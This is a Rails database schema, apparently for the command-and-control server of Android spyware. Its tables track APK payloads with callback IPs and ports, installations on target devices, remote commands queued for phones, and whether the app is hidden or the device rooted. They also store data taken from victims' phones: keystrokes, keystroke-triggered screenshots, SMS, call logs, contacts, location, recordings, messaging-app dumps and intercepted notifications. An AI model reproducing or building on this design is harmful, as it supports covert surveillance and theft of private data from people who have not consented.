# This file is auto-generated from the current state of the database. Instead
# of editing this file, please use the migrations feature of Active Record to
# incrementally modify your database, and then regenerate this schema definition.
#
# This file is the source Rails uses to define your schema when running `rails
# db:schema:load`. When creating a new database, `rails db:schema:load` tends to
# be faster and is potentially less error prone than running all of your
# migrations from scratch. Old migrations may fail to apply correctly if those
# migrations use external dependencies or application code.
#
# It's strongly recommended that you check this file into your version control system.

ActiveRecord::Schema.define(version: 2026_02_02_212206) do

  # These are extensions that must be enabled in order to support this database
  enable_extension "plpgsql"

  create_table "active_admin_comments", force: :cascade do |t|
    t.string "namespace"
    t.text "body"
    t.string "resource_type"
    t.bigint "resource_id"
    t.string "author_type"
    t.bigint "author_id"
    t.datetime "created_at", precision: 6, null: false
    t.datetime "updated_at", precision: 6, null: false
    t.index ["author_type", "author_id"], name: "index_active_admin_comments_on_author_type_and_author_id"
    t.index ["namespace"], name: "index_active_admin_comments_on_namespace"
    t.index ["resource_type", "resource_id"], name: "index_active_admin_comments_on_resource_type_and_resource_id"
  end

  create_table "admin_users", force: :cascade do |t|
    t.string "email", default: "", null: false
    t.string "encrypted_password", default: "", null: false
    t.string "reset_password_token"
    t.datetime "reset_password_sent_at"
    t.datetime "remember_created_at"
    t.datetime "created_at", precision: 6, null: false
    t.datetime "updated_at", precision: 6, null: false
    t.index ["email"], name: "index_admin_users_on_email", unique: true
    t.index ["reset_password_token"], name: "index_admin_users_on_reset_password_token", unique: true
  end

  create_table "apk_installations", force: :cascade do |t|
    t.string "target_ip"
    t.string "status"
    t.bigint "apk_payload_id", null: false
    t.index ["apk_payload_id"], name: "index_apk_installations_on_apk_payload_id"
  end

  create_table "apk_payloads", force: :cascade do |t|
    t.string "destination_ip"
    t.string "destination_port"
    t.string "forwarding_ip"
    t.string "forwarding_port"
    t.datetime "created_at", precision: 6, null: false
    t.datetime "updated_at", precision: 6, null: false
    t.string "name"
  end

  create_table "call_logs", force: :cascade do |t|
    t.date "date"
    t.string "filename"
    t.bigint "smartphone_id", null: false
    t.index ["smartphone_id"], name: "index_call_logs_on_smartphone_id"
  end

  create_table "contacts", force: :cascade do |t|
    t.bigint "smartphone_id", null: false
    t.string "filename"
    t.string "date"
    t.index ["smartphone_id"], name: "index_contacts_on_smartphone_id"
  end

  create_table "device_notifications", force: :cascade do |t|
    t.string "device_id", null: false
    t.string "package_name", null: false
    t.string "app_name"
    t.string "title"
    t.text "content"
    t.string "sub_text"
    t.string "category"
    t.integer "notification_id"
    t.string "group_key"
    t.boolean "is_ongoing", default: false
    t.boolean "is_clearable", default: true
    t.bigint "post_time"
    t.datetime "received_at"
    t.datetime "created_at", precision: 6, null: false
    t.datetime "updated_at", precision: 6, null: false
    t.index ["device_id", "post_time"], name: "index_device_notifications_on_device_id_and_post_time"
    t.index ["device_id"], name: "index_device_notifications_on_device_id"
    t.index ["package_name"], name: "index_device_notifications_on_package_name"
    t.index ["post_time"], name: "index_device_notifications_on_post_time"
  end

  create_table "geo_locations", force: :cascade do |t|
    t.date "date"
    t.string "lat"
    t.string "long"
    t.bigint "smartphone_id", null: false
    t.index ["smartphone_id"], name: "index_geo_locations_on_smartphone_id"
  end

  create_table "keylog_screenshots", force: :cascade do |t|
    t.bigint "smartphone_id", null: false
    t.string "device_id"
    t.bigint "client_timestamp"
    t.string "app_package"
    t.string "app_name"
    t.string "trigger_type"
    t.string "image_path"
    t.integer "width"
    t.integer "height"
    t.integer "file_size"
    t.string "session_id"
    t.datetime "created_at", precision: 6, null: false
    t.datetime "updated_at", precision: 6, null: false
    t.index ["client_timestamp"], name: "index_keylog_screenshots_on_client_timestamp"
    t.index ["device_id"], name: "index_keylog_screenshots_on_device_id"
    t.index ["smartphone_id"], name: "index_keylog_screenshots_on_smartphone_id"
    t.index ["trigger_type"], name: "index_keylog_screenshots_on_trigger_type"
  end

  create_table "keylogs", force: :cascade do |t|
    t.bigint "smartphone_id", null: false
    t.string "device_id"
    t.bigint "client_timestamp"
    t.string "app_package"
    t.string "app_name"
    t.string "activity"
    t.string "keystroke"
    t.text "full_text"
    t.string "input_type"
    t.string "field_id"
    t.string "event_type"
    t.string "session_id"
    t.datetime "created_at", precision: 6, null: false
    t.datetime "updated_at", precision: 6, null: false
    t.index ["app_package"], name: "index_keylogs_on_app_package"
    t.index ["client_timestamp"], name: "index_keylogs_on_client_timestamp"
    t.index ["device_id"], name: "index_keylogs_on_device_id"
    t.index ["event_type"], name: "index_keylogs_on_event_type"
    t.index ["smartphone_id"], name: "index_keylogs_on_smartphone_id"
  end

  create_table "messaging_apps_dumps", force: :cascade do |t|
    t.date "date"
    t.string "duration"
    t.string "filename"
    t.bigint "smartphone_id", null: false
    t.string "app_name"
    t.index ["smartphone_id"], name: "index_messaging_apps_dumps_on_smartphone_id"
  end

  create_table "notification_media", force: :cascade do |t|
    t.bigint "device_notification_id", null: false
    t.string "media_type", null: false
    t.binary "data"
    t.string "mime_type"
    t.datetime "created_at", precision: 6, null: false
    t.datetime "updated_at", precision: 6, null: false
    t.index ["device_notification_id"], name: "index_notification_media_on_device_notification_id"
    t.index ["media_type"], name: "index_notification_media_on_media_type"
  end

  create_table "pending_commands", force: :cascade do |t|
    t.bigint "smartphone_id", null: false
    t.string "request_id", null: false
    t.string "command", null: false
    t.json "params"
    t.integer "status", default: 0, null: false
    t.json "response_data"
    t.datetime "completed_at"
    t.datetime "created_at", precision: 6, null: false
    t.datetime "updated_at", precision: 6, null: false
    t.index ["created_at"], name: "index_pending_commands_on_created_at"
    t.index ["request_id"], name: "index_pending_commands_on_request_id", unique: true
    t.index ["smartphone_id"], name: "index_pending_commands_on_smartphone_id"
    t.index ["status"], name: "index_pending_commands_on_status"
  end

  create_table "pictures", force: :cascade do |t|
    t.date "date"
    t.string "filename"
    t.bigint "smartphone_id", null: false
    t.index ["smartphone_id"], name: "index_pictures_on_smartphone_id"
  end

  create_table "recordings", force: :cascade do |t|
    t.date "date"
    t.string "duration"
    t.string "filename"
    t.bigint "smartphone_id", null: false
    t.index ["smartphone_id"], name: "index_recordings_on_smartphone_id"
  end

  create_table "screenshots", force: :cascade do |t|
    t.date "date"
    t.string "duration"
    t.string "filename"
    t.bigint "smartphone_id", null: false
    t.index ["smartphone_id"], name: "index_screenshots_on_smartphone_id"
  end

  create_table "smartphones", force: :cascade do |t|
    t.string "operating_system"
    t.string "name"
    t.string "is_rooted"
    t.string "is_app_hidden"
    t.bigint "apk_installation_id", null: false
    t.datetime "created_at", precision: 6, null: false
    t.datetime "updated_at", precision: 6, null: false
    t.string "device_id"
    t.index ["apk_installation_id"], name: "index_smartphones_on_apk_installation_id"
  end

  create_table "sms_messages", force: :cascade do |t|
    t.date "date"
    t.bigint "smartphone_id", null: false
    t.string "filename"
    t.index ["smartphone_id"], name: "index_sms_messages_on_smartphone_id"
  end

  add_foreign_key "apk_installations", "apk_payloads"
  add_foreign_key "keylog_screenshots", "smartphones"
  add_foreign_key "keylogs", "smartphones"
  add_foreign_key "notification_media", "device_notifications"
  add_foreign_key "pending_commands", "smartphones"
  add_foreign_key "smartphones", "apk_installations"
end
